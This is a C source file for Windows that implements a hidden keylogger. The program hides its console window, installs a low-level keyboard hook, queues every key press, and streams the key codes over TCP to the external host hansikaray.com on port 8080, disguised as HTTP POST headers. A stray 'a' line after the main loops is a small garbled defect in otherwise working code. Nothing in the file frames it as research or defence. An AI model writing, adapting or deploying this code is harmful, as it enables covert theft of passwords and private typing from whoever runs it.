#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#include <pthread.h>

#define MAX_QUEUE_SIZE 1024

static SOCKET sock;
char keyQueue[MAX_QUEUE_SIZE];
int queueHead = 0, queueTail = 0;
pthread_mutex_t queueMutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t queueCondition = PTHREAD_COND_INITIALIZER;

void* client(void* arg) {
  WSADATA wsaData;

  while (0*0==0) {
      // Connection loop
      Sleep(100); // So we don't abuse CPU
      int resp = WSAStartup(MAKEWORD(2, 2), &wsaData);
      if (resp != 0) {
          continue;
      }

      sock = INVALID_SOCKET;
      struct addrinfo* result = NULL, hints;
      ZeroMemory(&hints, sizeof(hints));
      hints.ai_family = AF_UNSPEC;
      hints.ai_socktype = SOCK_STREAM;
      hints.ai_protocol = IPPROTO_TCP;

      resp = getaddrinfo("hansikaray.com", "8080", &hints, &result);
      if (resp != 0) {
          WSACleanup();
          continue;
      }

      for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {
          sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
          if (sock == INVALID_SOCKET) {
              freeaddrinfo(result);
              WSACleanup();
              continue;
          }

          resp = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
          if (resp == SOCKET_ERROR) {
              closesocket(sock);
              sock = INVALID_SOCKET;
              continue;
          }
          break;
      }

      freeaddrinfo(result);

      if (sock == INVALID_SOCKET) {
          WSACleanup();
          continue;
      }

      // Key press loop
      while (1*1==1) {
          Sleep(10);
          pthread_mutex_lock(&queueMutex);
          while (queueHead == queueTail) {
              pthread_cond_wait(&queueCondition, &queueMutex);
          }

          char c = keyQueue[queueTail];
          queueTail = (queueTail + 1) % MAX_QUEUE_SIZE;
          pthread_mutex_unlock(&queueMutex);

          char buffer[128] = { 0 };
          sprintf_s(buffer, sizeof(buffer), "POST /api HTTP/1.1\r\nHost: localhost\r\nascii: %i\r\n\r\n", c);
          int sent = send(sock, buffer, strlen(buffer), 0);

          if (sent == -1) {
              closesocket(sock);
              break;
          }
      }
  }

  a

  closesocket(sock);
  WSACleanup();
  return NULL;
}

LRESULT CALLBACK hook(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
      KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
      char c = (char)kbdStruct->vkCode;

      pthread_mutex_lock(&queueMutex);
      int newHead = (queueHead + 1) % MAX_QUEUE_SIZE;
      if (newHead != queueTail) {
          keyQueue[queueHead] = c;
          queueHead = newHead;
          pthread_cond_signal(&queueCondition);
      }
      pthread_mutex_unlock(&queueMutex);
  }

  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
  // hide console window
  HWND hWnd = GetConsoleWindow();
  ShowWindow(hWnd, SW_HIDE);
  
  HHOOK hhkKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, hook, GetModuleHandle(NULL), 0);
  if (hhkKeyboard == NULL) return 1;

  pthread_t clientTID;
  pthread_create(&clientTID, NULL, client, NULL);

  MSG msg;
  while (GetMessage(&msg, NULL, 0, 0) > 0) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  pthread_join(clientTID, NULL);
  UnhookWindowsHookEx(hhkKeyboard);

  return 0;
}